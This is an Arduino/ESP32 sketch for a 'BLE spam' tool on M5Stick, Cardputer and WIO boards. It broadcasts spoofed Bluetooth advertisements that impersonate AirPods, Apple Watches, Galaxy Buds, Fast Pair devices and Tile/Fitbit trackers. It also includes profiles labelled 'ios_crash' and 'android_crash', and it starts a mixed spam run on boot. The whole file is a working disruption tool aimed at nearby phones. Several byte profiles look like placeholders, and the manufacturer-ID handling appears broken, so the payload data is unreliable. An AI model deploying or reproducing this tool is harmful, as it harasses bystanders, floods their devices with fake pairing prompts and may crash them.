#include <vector>
#include <map>
#include <string>
#include <Arduino.h>
#if !defined(ARDUINO)
#endif
#if !defined(ARDUINO_ARCH_ESP32) && !defined(ARDUINO_ARCH_SAMD)
#include <HardwareSerial.h>
#endif
#if defined(ARDUINO_M5Cardputer)
#include <HardwareSerial.h>
#endif

#if !defined(ARDUINO_ARCH_ESP32) && !defined(ARDUINO_ARCH_SAMD)
extern HardwareSerial Serial;
#endif

// Platform detection
#if defined(ARDUINO_ARCH_ESP32)
  #include <BLEDevice.h>
  #include <BLEUtils.h>
  #include <BLEScan.h>
  #include <BLEAdvertising.h>
#elif defined(ARDUINO_SAMD_ZERO) && defined(ARDUINO_ARCH_SAMD) // WIO Terminal
  #include <rpcBLEDevice.h>
  #include <BLEAdvertisedDevice.h>
#endif

// Device-specific includes
#ifdef ARDUINO_M5Stick_C_Plus
  #include <M5StickCPlus.h>
#elif defined(ARDUINO_M5Stick_C_Plus2)
  #include <M5StickCPlus2.h>
#elif defined(ARDUINO_M5Cardputer)
  #include <M5Cardputer.h>
#elif defined(ARDUINO_ARCH_SAMD) && defined(SEEED_GROVE_UI_WIRELESS)
  #include <Seeed_Arduino_SFUD.h>
  #include <Seeed_Arduino_rpcUnified.h>
  #include <rtl8720d.h>
#endif

class AdvancedBLESpam {
private:
#if defined(ARDUINO_ARCH_ESP32)
    BLEScan* pScanner;
    BLEAdvertising* pAdvertising;
#elif defined(ARDUINO_ARCH_SAMD)
    BLEScan* pScanner;
    BLEAdvertising* pAdvertising;
#endif
    bool isSpamming;
    std::map<std::string, std::vector<uint8_t>> deviceProfiles;
    
    // Manufacturer IDs
    const uint16_t APPLE_MANUFACTURER_ID = 0x004C;
    const uint16_t SAMSUNG_MANUFACTURER_ID = 0x0075;
    const uint16_t MICROSOFT_MANUFACTURER_ID = 0x0006;
    const uint16_t GOOGLE_MANUFACTURER_ID = 0x00E0;
    const uint16_t TILE_MANUFACTURER_ID = 0x0048;
    const uint16_t FITBIT_MANUFACTURER_ID = 0x0078;

public:
    AdvancedBLESpam() : isSpamming(false) {
#if defined(ARDUINO_ARCH_ESP32) || defined(ARDUINO_ARCH_SAMD)
        pScanner = nullptr;
        pAdvertising = nullptr;
#endif
        initializeDeviceProfiles();
        setupDisplay();
    }

    ~AdvancedBLESpam() {
        stopSpam();
    }

    void setupDisplay() {
        // Initialize device-specific displays
#if defined(ARDUINO_M5Stick_C_Plus)
        M5.begin();
        M5.Lcd.setRotation(3);
        M5.Lcd.fillScreen(BLACK);
        M5.Lcd.setTextColor(WHITE);
        M5.Lcd.setTextSize(1);
#elif defined(ARDUINO_M5Stick_C_Plus2)
        M5.begin();
        M5.Lcd.setRotation(3);
        M5.Lcd.fillScreen(BLACK);
        M5.Lcd.setTextColor(WHITE);
#elif defined(ARDUINO_M5Cardputer)
        auto cfg = M5.config();
        M5Cardputer.begin(cfg, true);
        M5Cardputer.Display.setRotation(1);
        M5Cardputer.Display.setTextColor(GREEN);
#elif defined(ARDUINO_ARCH_SAMD) && defined(SEEED_GROVE_UI_WIRELESS) // WIO Terminal
        // WIO Terminal display setup would go here
#endif
    }

    void displayMessage(const char* message) {
#if defined(ARDUINO_M5Stick_C_Plus) || defined(ARDUINO_M5Stick_C_Plus2)
        M5.Lcd.setCursor(0, 0);
        M5.Lcd.fillScreen(BLACK);
        M5.Lcd.println(message);
#elif defined(ARDUINO_M5Cardputer)
        M5Cardputer.Display.setCursor(0, 0);
        M5Cardputer.Display.fillScreen(BLACK);
        M5Cardputer.Display.println(message);
#elif defined(ARDUINO_ARCH_SAMD) && defined(SEEED_GROVE_UI_WIRELESS)
        Serial.println(message); // WIO Terminal via Serial
#else
        Serial.println(message); // Headless mode
#endif
    }

    void initializeDeviceProfiles() {
        // ===== APPLE DEVICES =====
        deviceProfiles["airpods_gen1"] = {0x07, 0x19, 0x01, 0x02, 0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45};
        deviceProfiles["airpods_gen2"] = {0x07, 0x19, 0x01, 0x02, 0x20, 0x75, 0xAA, 0x30, 0x02, 0x00, 0x00, 0x45};
        deviceProfiles["airpods_gen3"] = {0x07, 0x19, 0x01, 0x02, 0x20, 0x75, 0xAA, 0x30, 0x03, 0x00, 0x00, 0x45};
        deviceProfiles["airpods_pro"] = {0x07, 0x19, 0x01, 0x02, 0x20, 0x75, 0xAA, 0x30, 0x04, 0x00, 0x00, 0x45};
        deviceProfiles["airpods_pro2"] = {0x07, 0x19, 0x01, 0x02, 0x20, 0x75, 0xAA, 0x30, 0x05, 0x00, 0x00, 0x45};
        deviceProfiles["airpods_max"] = {0x07, 0x19, 0x01, 0x02, 0x20, 0x75, 0xAA, 0x30, 0x06, 0x00, 0x00, 0x45};
        
        deviceProfiles["apple_watch_1"] = {0x07, 0x19, 0x01, 0x02, 0x20, 0x75, 0xAA, 0x30, 0x10, 0x00, 0x00, 0x45};
        deviceProfiles["apple_watch_2"] = {0x07, 0x19, 0x01, 0x02, 0x20, 0x75, 0xAA, 0x30, 0x11, 0x00, 0x00, 0x45};
        deviceProfiles["apple_watch_3"] = {0x07, 0x19, 0x01, 0x02, 0x20, 0x75, 0xAA, 0x30, 0x12, 0x00, 0x00, 0x45};
        
        deviceProfiles["apple_pencil_1"] = {0x07, 0x19, 0x01, 0x02, 0x20, 0x75, 0xAA, 0x30, 0x20, 0x00, 0x00, 0x45};
        deviceProfiles["apple_pencil_2"] = {0x07, 0x19, 0x01, 0x02, 0x20, 0x75, 0xAA, 0x30, 0x21, 0x00, 0x00, 0x45};

        // ===== SAMSUNG DEVICES =====
        deviceProfiles["galaxy_buds"] = {0x42, 0x09, 0x03, 0x01, 0x10, 0x03, 0x01, 0x00};
        deviceProfiles["galaxy_buds_plus"] = {0x42, 0x09, 0x03, 0x01, 0x10, 0x03, 0x02, 0x00};
        deviceProfiles["galaxy_buds_pro"] = {0x42, 0x09, 0x03, 0x01, 0x10, 0x03, 0x03, 0x00};
        deviceProfiles["galaxy_buds_live"] = {0x42, 0x09, 0x03, 0x01, 0x10, 0x03, 0x04, 0x00};
        deviceProfiles["galaxy_buds2"] = {0x42, 0x09, 0x03, 0x01, 0x10, 0x03, 0x05, 0x00};
        deviceProfiles["galaxy_watch"] = {0x01, 0x00, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00};

        // ===== GOOGLE/Fast Pair =====
        deviceProfiles["fast_pair"] = {0x2C, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
        deviceProfiles["pixel_buds"] = {0x2C, 0xFE, 0x44, 0x16, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66};
        deviceProfiles["google_tags"] = {0x2C, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01};

        // ===== TRACKING DEVICES =====
        deviceProfiles["tile_mate"] = {0x01, 0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE};
        deviceProfiles["tile_pro"] = {0x02, 0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE};
        deviceProfiles["tile_sticker"] = {0x03, 0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE};
        
        deviceProfiles["fitbit_charge"] = {0x01, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77};
        deviceProfiles["fitbit_versa"] = {0x02, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77};

        // ===== SMART HOME DEVICES =====
        deviceProfiles["smartthings_tag"] = {0x03, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07};
        deviceProfiles["amazon_tile"] = {0x01, 0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE};

        // ===== PENETRATION TESTING SPECIFIC =====
        deviceProfiles["continuity_spoof"] = {0x0F, 0x11, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00};
        deviceProfiles["ios_crash"] = {0x06, 0x10, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00};
        deviceProfiles["android_crash"] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    }

    bool begin(const char* deviceName = "MULTI_TOOL_BLE") {
#if defined(ARDUINO_ARCH_ESP32)
        if (!BLEDevice::getInitialized()) {
            BLEDevice::init(deviceName);
        }
        pAdvertising = BLEDevice::getAdvertising();
        pScanner = BLEDevice::getScan();
        if (!pAdvertising) {
            displayMessage("Failed to init BLE Advertising");
            return false;
        }
#elif defined(ARDUINO_ARCH_SAMD)
        // WIO Terminal BLE initialization
        if (!BLE.begin()) {
            return false;
        }
        // WIO BLE setup would be different
        // If you have a BLEAdvertising pointer for SAMD, initialize and check it here
#endif

        return true;
    }

    // ===== SPAM MODES =====
    
    void startAppleSpam(uint32_t durationMs = 0) {
        if (!begin()) return;
        
        isSpamming = true;
        uint32_t startTime = millis();
        uint32_t lastSwitchTime = startTime;
        
        displayMessage("Starting Apple Spam...");
        
        std::vector<std::string> appleDevices = {
            "airpods_gen1", "airpods_gen2", "airpods_gen3", "airpods_pro", 
            "airpods_pro2", "airpods_max", "apple_watch_1", "apple_watch_2", 
            "apple_watch_3", "apple_pencil_1", "apple_pencil_2"
        };
        
        while (isSpamming && (durationMs == 0 || (millis() - startTime) < durationMs)) {
            if (millis() - lastSwitchTime >= 500) {
                std::string randomDevice = appleDevices[random(0, appleDevices.size())];
                spamAppleDevice(randomDevice);
                lastSwitchTime = millis();
            }
            checkInput();
            delay(50);
        }
        stopSpam();
    }

    void startSamsungSpam(uint32_t durationMs = 0) {
        if (!begin()) return;
        
        isSpamming = true;
        uint32_t startTime = millis();
        uint32_t lastSwitchTime = startTime;
        
        displayMessage("Starting Samsung Spam...");
        
        std::vector<std::string> samsungDevices = {
            "galaxy_buds", "galaxy_buds_plus", "galaxy_buds_pro", 
            "galaxy_buds_live", "galaxy_buds2", "galaxy_watch"
        };
        
        while (isSpamming && (durationMs == 0 || (millis() - startTime) < durationMs)) {
            if (millis() - lastSwitchTime >= 500) {
                std::string randomDevice = samsungDevices[random(0, samsungDevices.size())];
                spamSamsungDevice(randomDevice);
                lastSwitchTime = millis();
            }
            checkInput();
            delay(50);
        }
        stopSpam();
    }

    void startTrackingSpam(uint32_t durationMs = 0) {
        if (!begin()) return;
        
        isSpamming = true;
        uint32_t startTime = millis();
        uint32_t lastSwitchTime = startTime;
        
        displayMessage("Starting Tracker Spam...");
        
        std::vector<std::string> trackingDevices = {
            "tile_mate", "tile_pro", "tile_sticker", 
            "fitbit_charge", "fitbit_versa", "smartthings_tag", "amazon_tile"
        };
        
        while (isSpamming && (durationMs == 0 || (millis() - startTime) < durationMs)) {
            if (millis() - lastSwitchTime >= 500) {
                std::string randomDevice = trackingDevices[random(0, trackingDevices.size())];
                spamTrackingDevice(randomDevice);
                lastSwitchTime = millis();
            }
            checkInput();
            delay(50);
        }
        stopSpam();
    }

    void startMixedSpam(uint32_t durationMs = 0) {
        if (!begin()) return;
        
        isSpamming = true;
        uint32_t startTime = millis();
        uint32_t lastSwitchTime = startTime;
        
        displayMessage("Starting Mixed Spam...");
        
        while (isSpamming && (durationMs == 0 || (millis() - startTime) < durationMs)) {
            if (millis() - lastSwitchTime >= 300) {
                int spamType = random(0, 4);
                switch (spamType) {
                    case 0: spamRandomAppleDevice(); break;
                    case 1: spamRandomSamsungDevice(); break;
                    case 2: spamRandomTrackingDevice(); break;
                    case 3: spamRandomPentestDevice(); break;
                }
                lastSwitchTime = millis();
            }
            checkInput();
            delay(50);
        }
        stopSpam();
    }

    // ===== INDIVIDUAL DEVICE SPAMMING =====

    void spamAppleDevice(const std::string& deviceType) {
        if (deviceProfiles.find(deviceType) == deviceProfiles.end()) return;
        
#if defined(ARDUINO_ARCH_ESP32)
        BLEAdvertisementData advertisementData;
        std::vector<uint8_t> manufacturerData = deviceProfiles[deviceType];
        
        manufacturerData.insert(manufacturerData.begin(), APPLE_MANUFACTURER_ID & 0xFF);
        manufacturerData.insert(manufacturerData.begin(), (APPLE_MANUFACTURER_ID >> 8) & 0xFF);
        
        advertisementData.setManufacturerData(std::string(manufacturerData.begin(), manufacturerData.end()));
        advertisementData.setName("Apple Device");
        advertisementData.setFlags(0x06);
        
        pAdvertising->setAdvertisementData(advertisementData);
        pAdvertising->start();
#endif
        
        char buffer[100];
        snprintf(buffer, sizeof(buffer), "Apple: %s", deviceType.c_str());
        displayMessage(buffer);
    }

    void spamSamsungDevice(const std::string& deviceType) {
        if (deviceProfiles.find(deviceType) == deviceProfiles.end()) return;
        
#if defined(ARDUINO_ARCH_ESP32)
        BLEAdvertisementData advertisementData;
        std::vector<uint8_t> manufacturerData = deviceProfiles[deviceType];
        
        manufacturerData.insert(manufacturerData.begin(), SAMSUNG_MANUFACTURER_ID & 0xFF);
        manufacturerData.insert(manufacturerData.begin(), (SAMSUNG_MANUFACTURER_ID >> 8) & 0xFF);
        
        advertisementData.setManufacturerData(std::string(manufacturerData.begin(), manufacturerData.end()));
        advertisementData.setName("Samsung Device");
        advertisementData.setFlags(0x06);
        
        pAdvertising->setAdvertisementData(advertisementData);
        pAdvertising->start();
#endif
        
        char buffer[100];
        snprintf(buffer, sizeof(buffer), "Samsung: %s", deviceType.c_str());
        displayMessage(buffer);
    }

    void spamTrackingDevice(const std::string& deviceType) {
        if (deviceProfiles.find(deviceType) == deviceProfiles.end()) return;
        
#if defined(ARDUINO_ARCH_ESP32)
        BLEAdvertisementData advertisementData;
        std::vector<uint8_t> manufacturerData = deviceProfiles[deviceType];
        
        uint16_t manufacturerId = TILE_MANUFACTURER_ID;
        if (deviceType.find("fitbit") != std::string::npos) {
            manufacturerId = FITBIT_MANUFACTURER_ID;
        } else if (deviceType.find("amazon") != std::string::npos) {
            manufacturerId = 0x00FC;
        }
        
        manufacturerData.insert(manufacturerData.begin(), manufacturerId & 0xFF);
        manufacturerData.insert(manufacturerData.begin(), (manufacturerId >> 8) & 0xFF);
        
        advertisementData.setManufacturerData(std::string(manufacturerData.begin(), manufacturerData.end()));
        advertisementData.setName("Tracking Device");
        advertisementData.setFlags(0x06);
        
        pAdvertising->setAdvertisementData(advertisementData);
        pAdvertising->start();
#endif
        
        char buffer[100];
        snprintf(buffer, sizeof(buffer), "Tracker: %s", deviceType.c_str());
        displayMessage(buffer);
    }

    // Helper methods
    void spamRandomAppleDevice() {
        std::vector<std::string> appleDevices = {"airpods_gen1", "airpods_gen2", "airpods_pro", "apple_watch_1"};
        std::string randomDevice = appleDevices[random(0, appleDevices.size())];
        spamAppleDevice(randomDevice);
    }

    void spamRandomSamsungDevice() {
        std::vector<std::string> samsungDevices = {"galaxy_buds", "galaxy_buds_pro", "galaxy_watch"};
        std::string randomDevice = samsungDevices[random(0, samsungDevices.size())];
        spamSamsungDevice(randomDevice);
    }

    void spamRandomTrackingDevice() {
        std::vector<std::string> trackingDevices = {"tile_mate", "fitbit_charge", "smartthings_tag"};
        std::string randomDevice = trackingDevices[random(0, trackingDevices.size())];
        spamTrackingDevice(randomDevice);
    }

    void spamRandomPentestDevice() {
        std::vector<std::string> pentestDevices = {"continuity_spoof", "fast_pair"};
        std::string randomDevice = pentestDevices[random(0, pentestDevices.size())];
        spamTrackingDevice(randomDevice);
    }

    // ===== INPUT HANDLING =====
    
    void checkInput() {
#if defined(ARDUINO_M5Stick_C_Plus) || defined(ARDUINO_M5Stick_C_Plus2)
        M5.update();
        if (M5.BtnA.wasPressed()) {
            stopSpam();
        }
        if (M5.BtnB.wasPressed()) {
            // Change mode or other function
        }
#elif defined(ARDUINO_M5Cardputer)
        M5Cardputer.update();
        if (M5Cardputer.Keyboard.isChange()) {
            if (M5Cardputer.Keyboard.isPressed()) {
                Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();
                for (auto i : status.word) {
                    if (i == 's' || i == 'S') {
                        stopSpam();
                    }
                }
            }
        }
#endif
    }

    // ===== UTILITY METHODS =====

    void stopSpam() {
        isSpamming = false;
#if defined(ARDUINO_ARCH_ESP32)
        if (pAdvertising) {
            pAdvertising->stop();
        }
        if (pScanner) {
            pScanner->stop();
        }
#elif defined(ARDUINO_ARCH_SAMD)
        if (BLE.connected()) {
            BLE.stopAdvertise();
        }
#endif
        displayMessage("BLE Spam Stopped");
    }

    bool isActive() const {
        return isSpamming;
    }

    void listProfiles() {
        displayMessage("Available Profiles:");
        delay(1000);
        
        char buffer[50];
        snprintf(buffer, sizeof(buffer), "Total: %d", deviceProfiles.size());
        displayMessage(buffer);
    }

    size_t getProfileCount() const {
        return deviceProfiles.size();
    }
};

// ===== GLOBAL INSTANCE =====
AdvancedBLESpam bleSpam;

void setup() {
    Serial.begin(115200);
    
    // Initialize random seed
    randomSeed(analogRead(0));
    
    bleSpam.displayMessage("BLE Spam Tool Started");
    delay(2000);
    
    bleSpam.listProfiles();
    delay(2000);
    
    // Example: Start mixed spam for 30 seconds
    bleSpam.displayMessage("Starting Mixed Spam...");
    bleSpam.startMixedSpam(30000);
}

void loop() {
    // Main loop can handle menu system or other logic
#if defined(ARDUINO_M5Cardputer)
    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isPressed()) {
        // Handle keyboard input for menu
    }
#endif

    // Serial commands for all devices
    if (Serial.available()) {
        String command = Serial.readString();
        command.trim();
        
        if (command == "apple") {
            bleSpam.startAppleSpam(10000);
        } else if (command == "samsung") {
            bleSpam.startSamsungSpam(10000);
        } else if (command == "tracking") {
            bleSpam.startTrackingSpam(10000);
        } else if (command == "mixed") {
            bleSpam.startMixedSpam(10000);
        } else if (command == "stop") {
            bleSpam.stopSpam();
        } else if (command == "list") {
            bleSpam.listProfiles();
        }
    }
    
    delay(100);
}